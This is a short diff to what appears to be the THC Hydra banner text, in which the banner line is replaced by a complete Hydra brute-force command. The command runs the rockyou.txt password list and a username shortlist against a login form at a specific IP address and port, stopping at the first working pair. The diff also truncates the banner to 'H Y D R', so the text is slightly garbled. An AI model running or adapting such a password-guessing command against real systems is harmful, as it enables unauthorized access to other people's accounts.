@@ -1,5 +1,5 @@
-
-				  H Y D R A
+sudo hydra  -L /opt/useful/seclists/usernames/top-usernames_shortlist.txt -P /opt/useful/seclists/passwords/Leaked-Databases/rockyou.txt -u -f  209.97.142.95 -s 32710 http-post-form -login.php:aurangzeb4712=^USER^&pasword=^PASS^:F=form name=login
+				  H Y D R 
 
                       (c) 2001-2023 by van Hauser / THC
              <vh@thc.org> https://github.com/vanhauser-thc/thc-hydra
